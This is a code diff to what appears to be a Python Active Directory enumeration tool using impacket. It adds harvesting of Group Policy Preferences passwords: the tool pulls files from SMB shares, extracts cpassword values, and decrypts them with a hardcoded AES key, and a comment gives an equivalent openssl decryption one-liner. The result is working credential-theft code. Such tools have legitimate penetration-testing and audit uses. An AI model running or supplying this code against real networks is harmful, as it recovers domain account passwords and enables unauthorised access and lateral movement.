@@ -8,6 +8,7 @@ from getpass import getpass
 from termcolor import colored
 from impacket import smbconnection
 from impacket.dcerpc.v5 import srvs
+from Crypto.Cipher import AES
 import contextlib
 import argparse, textwrap, errno, sys, socket, json, re, os
 
@@ -275,10 +276,13 @@ class EnumAD():
                                 paths.append(dirname + '\\' + sub.get_shortname())
                     except (SessionError, UnicodeEncodeError, NetBIOSError) as e:
                         continue
-                # Since the first entry is the DC we dont want that
                 
-                #cpassRE = re.compile(r'cpassword=\"([a-zA-Z0-9]+)\"')
-                cpassRE = re.compile(r'Version=([a-zA-Z0-9]+)')
+                # Decrypt:
+                # base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000
+                cpassRE = re.compile(r'cpassword=\"([a-zA-Z0-9/]+)\"')
+                #cpassRE = re.compile(r'Version=([a-zA-Z0-9]+)')
+                cipher = AES.new(bytes.fromhex('4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b'), AES.MODE_CBC, '\x00' * 16)
+                # Since the first entry is the DC we dont want that
                 for item in paths[1:]:
                     if '.' in item.split('\\')[-1]:
                     #if '.xml' in item.split('\\')[-1]:
@@ -286,8 +290,11 @@ class EnumAD():
                             smbconn.getFile(str(share['shi1_netname']).rstrip('\0'), item, f.write)             
                         with open('file-content-{0}-{1}.log'.format(item.split('\\')[-2], item.split('\\')[-1]), 'r') as f:
                             try:
-                                match = cpassRE.search(f.read())
-                                cpasswords.append(match.group(0))
+                                match = cpassRE.findall(f.read())
+                                #cpasswords.append(match.group(0))
+                                for hit in match:
+                                    padding = '=' * (4 - len(hit) % 4) 
+                                    cpasswords.append(cipher.decrypt(base64.b64decode(bytes(hit + padding, 'utf-8'))).strip())
                             except (UnicodeDecodeError, AttributeError) as e:
                                 continue
         print(cpasswords)
